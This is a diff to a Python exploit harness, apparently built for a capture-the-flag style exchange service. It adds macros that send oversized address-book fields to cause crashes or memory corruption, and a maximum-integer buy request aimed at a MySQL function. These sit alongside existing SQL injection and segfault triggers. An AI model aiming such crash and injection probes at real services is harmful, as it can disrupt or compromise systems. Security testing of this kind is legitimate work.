@@ -29,6 +29,27 @@ def trigger_double_signout(p: tube):
     user_signout(p, ProtossInterface(), USER_HANDLER)
     user_signout(p, ProtossInterface(), USER_HANDLER)
 
+def trigger_cannot_deref(p: tube):
+    auto_set(p)
+    payload = ''
+    for i in range(1, 11):
+        add_addrbook(p, ProtossInterface(), EXCHANGE_HANDLER, set_addressbook(0, str(1) * 254, str(i)))
+        sleep(1)
+    pause()
+    # for ascii_code in range(65, 91 - 9):
+    #     payload += chr(ascii_code) * 8
+    # payload += 'A' * 7 # + NULL-byte
+    
+    # for num in range(5):
+    #     payload += str(num) * 8
+    # payload += str(5) * 7
+    before_payload = chr(65) * 255
+    modify_addrbook(p, ProtossInterface(), EXCHANGE_HANDLER, set_modify_addressbook(-1, '1' * (255 - 8), before_payload, '0'))
+    pause()
+    for i in range(1, 11):
+        modify_addrbook(p, ProtossInterface(), EXCHANGE_HANDLER, set_modify_addressbook(-1, before_payload, 'before_payload', '0'))
+
+
 # -------------------------------------------------------------------
 
 def try_sqli(p):
@@ -58,16 +79,30 @@ def fake_trade(p):
     sell(p, ProtossInterface(), EXCHANGE_HANDLER, set_sell(0, 1))
     view_history(p, ProtossInterface(), EXCHANGE_HANDLER, set_history(0, 0))
 
+def insert_addrbook(p):
+    auto_set(p)
+    for i in range(1, 11):
+        add_addrbook(p, ProtossInterface(), EXCHANGE_HANDLER, set_addressbook(0, str(i), str(i)))
+        sleep(1)
+
+def max_value_mysql_func(p: tube):
+    auto_set(p)
+    pause()
+    buy(p, ProtossInterface(), EXCHANGE_HANDLER, set_buy(0, 1, 0x7fffffff))
+
 macros.append(auto_set)
 macros.append(trigger_login_sigsegv)
 macros.append(trigger_history_sigsegv)
 macros.append(trigger_invalid_access)
 macros.append(trigger_double_signout)
+macros.append(trigger_cannot_deref)
 macros.append(try_sqli)
 macros.append(dup_signup)
 macros.append(send_max_bytes)
 macros.append(send_deposit)
 macros.append(fake_trade)
+macros.append(insert_addrbook)
+macros.append(max_value_mysql_func)
 
 def custom_payload(p: tube):
     print("Select Custom Payload")
